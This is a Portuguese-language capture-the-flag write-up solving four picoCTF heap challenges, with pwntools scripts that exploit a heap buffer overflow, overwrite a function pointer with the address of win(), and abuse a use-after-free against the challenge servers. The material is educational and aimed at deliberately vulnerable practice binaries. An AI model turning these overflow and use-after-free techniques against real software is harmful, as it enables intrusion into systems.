## Autor: Gebra  
  
# Heap:

A Heap é uma área da memória dinâmica(RAM) usada por programas para alocar e desalocar dados de forma flexível durante a
execução do código. E vamos explorar as seguintes vulnerabilidades: 

1.Buffer Overflow: Ultrapassar o tamanho alocado de memória em uma variável para alterar memória adjacente. 

2.UAF(Use After Free): Programa Acessa bloco de memória já liberado, permitindo a modificação dos dados.

## Exercício 1:
### Resolução via terminal:
Esse exercício foi projetado para ser de estágio inicial, por isso a Heap pode ser visualizada dentro do próprio código.
```python
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
```

Executando o código, é possivel descobrir os endereços de cada variável na heap.

![image](https://github.com/user-attachments/assets/655c496d-9e70-4afd-9f06-bb07769e6609)


Com esses dados, podemos verificar as distância entre os endereços e conseguir o offset dos dois, assim descobrimos que é 
32 bytes e que precisamos fazer um estouro desse tamanho.
Digitando esse comando no cmd, você receba a string de 33 caracteres pronta para teste.
    
    python3 -c 'print("a"*33)'

Colocando essa string como input do buffer você irá sobrescrever "pico" por "a"*32 e "bico" por "a". 
![image](https://github.com/user-attachments/assets/0c9ee24a-26aa-453a-9832-a249eb25d012)


Assim você consegue a flag ao digitar 4.

### Resolução via pwntools:
![image](https://github.com/user-attachments/assets/a63b90a8-f8c8-4770-8b1f-8519f5ac2077)


Criamos p como process para teste e depois partimos para o remote onde conseguiremos a flag verdadeira.
```python
    p = remote("tethys.picoctf.net", 55850)
```
Depois Criamos um payload para enviar para o código.
```python
    payload = "a" * 33
```
Depois enviamos o payload para o código e recebemos a flag.
```python
    p.recvuntil("choice:")

    p.sendline("2")
    p.sendline(payload)
    
    p.recvuntil("choice:")
    p.sendline("4")

    print(p.recvall())
```


## Exercício 2:
Para o restante dos exercícios vou explicar apenas pelo pwntools para acostumarmos com essa ferramenta.

Dando uma olhada no código do exercício `heap 1` a única diferença para o exercício anterior é que temos que modificar o valor de safe_var para um valor específico (`pico`), para isso devemos sobrescrever os 32bytes de offset e no 33º byte começamos a inserir a string `pico`.

```python
payload = "a"*32 + "pico"
```
Dessa forma nosso payload será composto pelos caracteres de preenchimento, "a" no caso, e "pico" para preencher a `safe_var`.


## Exercício 3:
Nesse exercício observamos que a função `win()` não é chamada em nenhum momento no decorrer do código, mas vamos observar um pouco a função `check_win()`.

```python
void check_win() { ((void (*)())*(int*)x)(); }
```
Essa função chama uma função voide através do endereço de memória fornecido em `x`, assim, se alterarmos o valor de x para o endereço de `win()` conseguimos chamar essa função e ganhar a flag do desafio.

Podemos utilizar a ferramenta `objdump` junto com `grep` no terminal para buscar onde está localizada a função que queremos.

![image](https://github.com/user-attachments/assets/94270fea-cb11-4506-87ec-7a60f178191f)

`-d` faz o disassemble do arquivo selecionado e grep filtra os dados encontrados, mostrando somente os que contém win no nome. Agora precisamos preparar nosso payload.

```python
junk = b"a"*32
win_adress = p32(0x04011a0)
payload = junk + win_adress
```

Usamos p32 para transformar o endereço de memória obtido no formato `little-endian`, sua representação em 32 bits. Desse modo já conseguimos obter nossa flag enviando esse payload para o código.


## Exercício 4:
Último exercício da série, em `heap 3` observamos que precisamos modificar o valor de uma struct chamada `object` que é declarada com o nome de x. 

```python
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
```

Mais especificamente o campo flag da struct.

```python
if(!strcmp(x->flag, "pico"))
```

Observando o que o código nos disponibiliza, há algumas novas opções, Allocate object e Free x são as principais. 

![image](https://github.com/user-attachments/assets/5f18612b-9e2c-4045-9ba3-44f79de11ebd)

Selecionando a opção 2 a aplicação nos pede o tamanho do objeto para alocar. Diferente dos exercícios anteriores o foco não é calcular o offset para chegar à variável, nesse exercício devemos perceber que mesmo dando free(x) ainda é feita a verificação de `x->flag`, portanto precisamos alocar um objeto de mesmo tamanho que nossa struct `object` para tentar ocupar o mesmo espaço de memória ocupado por x antes de ser desalocado.

```python
from pwn import *

#p = process("chall")

p = remote("tethys.picoctf.net", 53444)

payload = "a" * 30 + "pico"

p.recvuntil("choice:")
p.sendline("5")

p.recvuntil("choice:")
p.sendline("2")

p.recvuntil("allocation:")
p.sendline("35")
p.sendline(payload)

p.recvuntil("choice:")
p.sendline("4")

print(p.recvall())
```

O script em si é parecido com o de `heap1` mas precisamos entender o que foi comentado anteriormente para explorar o UAF.
